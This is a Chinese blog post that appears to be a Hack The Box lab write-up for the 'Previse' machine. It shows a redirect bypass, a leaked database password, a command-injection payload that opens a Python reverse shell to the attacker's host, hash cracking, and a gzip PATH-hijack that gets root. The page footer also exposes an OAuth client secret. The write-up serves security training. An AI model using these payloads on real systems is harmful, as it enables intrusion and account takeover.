<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Previse - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Previse靶场信息  靶场类型  信息搜集使用nmap进行端口扫描 ┌──(root💀root)-[~&#x2F;Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.11.104 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-08-08 22:27 CST Nmap scan report f">
<meta property="og:type" content="article">
<meta property="og:title" content="Previse - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Previse靶场信息  靶场类型  信息搜集使用nmap进行端口扫描 ┌──(root💀root)-[~&#x2F;Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.11.104 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-08-08 22:27 CST Nmap scan report f">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image1.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image2.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image3.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image4.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image5.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image6.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image7.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image8.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image9.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image10.png">
<meta property="article:published_time" content="2021-08-09T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:49:17.706Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image1.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Previse - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Previse - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-08-09T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2021-08-09
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Previse"><span class="post-toc-text">Hackthebox - Previse</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#hashcat"><span class="post-toc-text">hashcat</span></a></li></ol></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Easy/Hackthebox-Previse"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Previse - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-08-09 19:38:36" datetime="2021-08-09T11:38:36.000Z"  itemprop="datePublished">2021-08-09</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Previse"><a href="#Hackthebox-Previse" class="headerlink" title="Hackthebox - Previse"></a>Hackthebox - Previse</h1><h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><img src="/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image1.png" class>

<h2 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h2><img src="/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image2.png" class>

<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>使用nmap进行端口扫描</p>
<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
└─# nmap -A -sS -sC -sV -p- 10.10.11.104
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 22:27 CST
Nmap scan report for 10.10.11.104
Host is up (0.25s latency).
Not shown: 65461 closed ports, 72 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/8%OT=22%CT=1%CU=38368%PV=Y%DS=2%DC=T%G=Y%TM=610FF0E8
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   249.39 ms 10.10.14.1
2   249.51 ms 10.10.11.104

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1810.62 seconds
</code></pre>
<p>咱们进80端口看一下HTTP服务的内容</p>
<img src="/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image3.png" class>

<p>这是一个文件管理服务器，我测试了一下简单的弱口令无果，咱们先fuzz一下吧</p>
<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100 -e php,html,txt -mc 200,302,301 -u http://10.10.11.104/FUZZ

        /&#39;___\  /&#39;___\           /&#39;___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.104/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
 :: Extensions       : php html txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,302,301
________________________________________________

login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
index.php               [Status: 302, Size: 2801, Words: 737, Lines: 72]
index.html              [Status: 200, Size: 663, Words: 24, Lines: 23]
download.php            [Status: 302, Size: 0, Words: 1, Lines: 1]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6]
header.php              [Status: 200, Size: 980, Words: 183, Lines: 21]
favicon.ico             [Status: 200, Size: 15406, Words: 15, Lines: 10]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
.                       [Status: 302, Size: 2801, Words: 737, Lines: 72]
status.php              [Status: 302, Size: 2968, Words: 749, Lines: 75]
nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]
index.html              [Status: 200, Size: 663, Words: 24, Lines: 23]
index.php               [Status: 302, Size: 2801, Words: 737, Lines: 72]
accounts.php            [Status: 302, Size: 3994, Words: 1096, Lines: 94]
files.php               [Status: 302, Size: 4914, Words: 1531, Lines: 113]
login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
files.php               [Status: 302, Size: 4914, Words: 1531, Lines: 113]
:: Progress: [148168/148168] :: Job [1/1] :: 391 req/sec :: Duration: [0:06:55] :: Errors: 4 ::
</code></pre>
<p>直接访问了部分页面，都会跳转到<code>index.php</code>页面，使用curl访问试试</p>
<pre><code class="Plain">curl http://10.10.11.104/files.php

&lt;td&gt;&lt;a href=&#39;download.php?file=32&#39;&gt;&lt;button class=&quot;uk-button uk-button-text&quot;&gt;siteBackup.zip&lt;/button&gt;&lt;/a&gt;&lt;/td&gt;
</code></pre>
<p>这样看来，我们可以通过一些特殊的技巧来访问部分页面</p>
<p>访问</p>
<pre><code class="Plain">/accounts.php
</code></pre>
<p>会跳转到</p>
<pre><code class="Plain">/index.php
</code></pre>
<p>，这里我们使用burp抓包</p>
<img src="/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image4.png" class>

<img src="/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image5.png" class>

<p>抓包后点击 Do interrcept &gt; Response to this request 来进行更改状态码</p>
<img src="/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image6.png" class>

<p>将框选起来的部分修改为</p>
<pre><code class="Plain">HTTP/1.1 200
</code></pre>
<p>然后放包</p>
<img src="/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image7.png" class>

<p>成功进入添加新用户的页面</p>
<p>添加一个新用户</p>
<p>创建好以后，会自动跳转到</p>
<pre><code class="Plain">index.php
</code></pre>
<p>页面，然后去登录</p>
<img src="/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image8.png" class>

<p>登入后在</p>
<pre><code class="Plain">FILES
</code></pre>
<p>页面下有一个上传点和一个文件</p>
<pre><code class="Plain">SITEBACKUP.ZIP
</code></pre>
<p>，先下载下来看看 ### config.php</p>
<pre><code class="Plain">&lt;?php

function connectDB(){
    $host = &#39;localhost&#39;;
    $user = &#39;root&#39;;
    $passwd = &#39;mySQL_p@ssw0rd!:)&#39;;
    $db = &#39;previse&#39;;
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?&gt;
</code></pre>
<p>得到了mysql的账号密码 ### logs.php</p>
<pre><code class="Plain">&lt;?php
session_start();
if (!isset($_SESSION[&#39;user&#39;])) {
    header(&#39;Location: login.php&#39;);
    exit;
}
?&gt;

&lt;?php
if (!$_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;POST&#39;) {
    header(&#39;Location: login.php&#39;);
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec(&quot;/usr/bin/python /opt/scripts/log_process.py {$_POST[&#39;delim&#39;]}&quot;);
echo $output;

$filepath = &quot;/var/www/out.log&quot;;
$filename = &quot;out.log&quot;;

if(file_exists($filepath)) {
    header(&#39;Content-Description: File Transfer&#39;);
    header(&#39;Content-Type: application/octet-stream&#39;);
    header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.basename($filepath).&#39;&quot;&#39;);
    header(&#39;Expires: 0&#39;);
    header(&#39;Cache-Control: must-revalidate&#39;);
    header(&#39;Pragma: public&#39;);
    header(&#39;Content-Length: &#39; . filesize($filepath));
    ob_clean(); // Discard data in the output buffer
    flush(); // Flush system headers
    readfile($filepath);
    die();
} else {
    http_response_code(404);
    die();
}
?&gt;
</code></pre>
<p>从上述代码审计发现，这台靶机的程序使用了python进行编写，而不是PHP，从代码看起来，这很容易被命令注入 ## 漏洞利用</p>
<img src="/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image9.png" class>

<p>点击 MANAGEMENT MENU &gt; LOG DATA &gt; SUBMIT使用burp抓包</p>
<img src="/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/image10.png" class>

<pre><code class="Plain">delim=comma;python3+-c+&#39;import+os,pty,socket%3bs%3dsocket.socket()%3bs.connect((&quot;10.10.14.110&quot;,4444)) %3b[os.dup2(s.fileno(),f)for+f+in(0,1,2)]%3bpty.spawn(&quot;/bin/bash&quot;)&#39;
</code></pre>
<p>使用nc监听端口，即可getshell</p>
<pre><code class="Plain">(root💀root)-[~/Desktop]
└─# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.110] from (UNKNOWN) [10.10.11.104] 56380
bash-4.4$ whoami&amp;&amp;id
whoami&amp;&amp;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p>登录mysql</p>
<pre><code class="Plain">bash-4.4$ mysql -u root -p
mysql -u root -p
Enter password: mySQL_p@ssw0rd!:)

show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+

use previse;
show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+

select * from accounts;
+----+-----------+------------------------------------+---------------------+
| id | username  | password                           | created_at          |
+----+-----------+------------------------------------+---------------------+
|  1 | m4lwhere  | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.   | 2021-05-27 18:18:36 |
|  2 | robin     | $1$🧂llol$gBt8as2nJZA5K1YqzaH9Z/   | 2021-08-08 12:38:45 |
|  4 | caratortu | $1$🧂llol$04L/OghOADV.ufho3gKfY.   | 2021-08-08 13:23:42 |
|  5 | bobby     | $1$🧂llol$SyqVySL69GZ.tBbiicFiT/   | 2021-08-08 14:02:50 |
|  6 | lucifiel  | $1$🧂llol$K9wrU9maYCFrqr482bGkS/   | 2021-08-08 17:49:18 |
|  7 | 0xrf1606  | $1$🧂llol$rObjMowMWOzqMlAz8ZsBc1   | 2021-08-08 18:02:45 |
+----+-----------+------------------------------------+---------------------+
</code></pre>
<p>通过查看home目录，发现<code>m4lwhere</code>这个用户是我们需要的用户(其他用户都是其他正在做这台靶机的人创建的，基于HTB的规则，咱们不要影响到其他人)，咱们把它的hash拿去使用hashcat或者john破解 ### john</p>
<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
└─# john -format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 2 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
ilovecody112235! (?)
1g 0:00:20:20 DONE (2021-08-09 02:51) 0.000819g/s 6073p/s 6073c/s 6073C/s ilovecody31..ilovecody..
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed

┌──(root💀root)-[~/Desktop]
└─# john --show hash
?:ilovecody112235!

1 password hash cracked, 0 left
</code></pre>
<h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><pre><code class="Plain">┌──(root💀root)-[~/Desktop]
└─# hashcat -a 0 -m 500 hash --wordlist /usr/share/wordlists/rockyou.txt -o 123                                                                                                                             255 ⨯
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-6700K CPU @ 4.00GHz, 2868/2932 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

┌──(root💀root)-[~/Desktop]
└─# cat 123
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
</code></pre>
<p>得到了账号密码</p>
<pre><code class="Plain">username = m4lwhere
password = ilovecody112235!
</code></pre>
<p>使用ssh进行登录</p>
<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
└─# ssh m4lwhere@10.10.11.104
m4lwhere@10.10.11.104&#39;s password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug  8 19:21:55 UTC 2021

  System load:  0.4               Processes:           202
  Usage of /:   49.2% of 4.85GB   Users logged in:     0
  Memory usage: 20%               IP address for eth0: 10.10.11.104
  Swap usage:   0%

0 updates can be applied immediately.

Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5
m4lwhere@previse:~$ whoami&amp;&amp;id
m4lwhere
uid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere)
</code></pre>
<pre><code class="Plain">m4lwhere@previse:~$ cat user.txt
29e7b0a44a1b8cc46856e3b43ccdcfa4
</code></pre>
<p>成功获得user权限的flag ## 权限提升 使用sudo -l查看一下m4lwhere用户的sudo权限</p>
<pre><code class="Plain">m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere:
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
</code></pre>
<p>查看一下这个文件</p>
<pre><code class="Plain">m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time

gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz
</code></pre>
<p>提权</p>
<pre><code class="Plain">cd /tmp
cat &lt;&lt; EOF &gt; gzip
&gt; #!/bin/bash
&gt; cp /bin/bash /tmp/c
&gt; chmod u+s /tmp/c
&gt; EOF
chmod +x gzip
export PATH=$( pwd ):$PATH

sudo /opt/scripts/access_backup.sh
./c -p
</code></pre>
<pre><code class="Plain">c-4.4# whoami&amp;&amp;id
root
uid=1000(m4lwhere) gid=1000(m4lwhere) euid=0(root) groups=1000(m4lwhere)
</code></pre>
<p>成功提权到root权限</p>
<pre><code class="Plain">c-4.4# cd /root
c-4.4# ls
root.txt
c-4.4# cat root.txt
76a5854ac1f5d8cb5e1079cb1964dacf
</code></pre>
<p>成功拿到root权限的flag</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/&title=《Previse - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/&title=《Previse - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Previse - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2021/09/27/Hackthebox/Easy/Hackthebox-Validation/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Validation - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2021/08/06/Hackthebox/Medium/Hackthebox-Writer/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Writer - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2023</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/&title=《Previse - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/&title=《Previse - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/08/09/Hackthebox/Easy/Hackthebox-Previse/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
